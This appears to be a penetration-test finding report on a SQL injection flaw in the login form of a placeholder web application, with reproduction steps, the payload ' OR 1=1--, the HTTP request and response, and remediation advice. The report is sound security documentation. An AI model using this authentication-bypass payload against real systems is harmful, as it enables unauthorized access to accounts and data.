## Vulnerability Overview

SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. This vulnerability occurs when user-supplied input is incorporated into SQL queries without proper sanitization or parameterization. An attacker can manipulate SQL queries by injecting malicious SQL code through input fields, URL parameters, or HTTP headers. This can lead to unauthorized access to sensitive data, modification or deletion of database records, and in some cases, complete system compromise. SQL injection remains one of the most critical web application vulnerabilities and is consistently ranked in the OWASP Top 10.

### Finding Details

**Vulnerability Type:** SQL Injection

**Severity:** Critical (CVSS 9.0)

**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

**Affected URL:** https://vulnerable-app.example.com/login

**Affected Parameter:** username

**HTTP Method:** POST

**Detection Confidence:** high

**Discovery Date:** 2025-11-23

#### Vulnerability Description

The login form at /login is vulnerable to SQL injection via the username parameter. By injecting a SQL comment sequence and boolean condition, authentication can be completely bypassed. The application directly concatenates user input into SQL queries without using parameterized statements, allowing attackers to manipulate the query logic.

**Detected Behaviors:**

- SQL_ERROR_MESSAGE
- STATUS_CODE_CHANGE (401 → 200)
- AUTHENTICATION_BYPASS

### Steps To Reproduce

1. Navigate to https://vulnerable-app.example.com/login
2. In the username field, enter: ' OR 1=1--
3. In the password field, enter any value (e.g., "test")
4. Click the "Login" button
5. Observe successful authentication bypass - user is logged in as the first user in the database (typically admin)
6. Verify by checking the session cookie and accessing restricted pages

#### Proof of Concept

**Payload Used:**

```
' OR 1=1--
```

### Evidence

#### Authentication Bypass Screenshot

![Authentication Bypass](../evidence/sqli-bypass.png)

#### HTTP Request

```http
POST /login HTTP/1.1
Host: vulnerable-app.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

username=' OR 1=1--&password=test
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: text/html

<html>
  <body>
    <h1>Welcome, Administrator!</h1>
    ...
  </body>
</html>
```

#### SQL Query Analysis

```sql
-- Vulnerable Query (reconstructed from error messages):
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'test'

-- The query becomes:
-- SELECT * FROM users WHERE username = '' OR 1=1
-- (Everything after -- is commented out)
-- This returns all users, and the first one is used for authentication
```

## Recommendations

To address this finding, implement the following:

- **Use Parameterized Queries**: Implement prepared statements with parameterized queries for all database interactions. This ensures that user input is treated as data, not executable code.
- **Input Validation**: Implement strict input validation on both client and server sides. Use allowlists to define acceptable input patterns.
- **Least Privilege Principle**: Configure database accounts with minimal necessary permissions. Application accounts should not have administrative privileges.
- **Web Application Firewall (WAF)**: Deploy a WAF with rules to detect and block SQL injection attempts.
- **Regular Security Testing**: Conduct periodic penetration testing and code reviews to identify potential SQL injection vulnerabilities.

## References

See the following for more information:

- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger: SQL Injection](https://portswigger.net/web-security/sql-injection)
- Classification: CWE-89 | A03:2021 – Injection

## Impacts

If not addressed, this finding could lead to the following:

- **Data Breach**: An attacker could extract sensitive information including user credentials, personal data, financial records, and proprietary business information.
- **Authentication Bypass**: Attackers could bypass login mechanisms and gain unauthorized access to user accounts, including administrative accounts.
- **Data Manipulation**: The database could be modified or deleted, leading to data integrity issues and potential business disruption.
- **System Compromise**: In severe cases, attackers may execute operating system commands through database functions, leading to full server compromise.
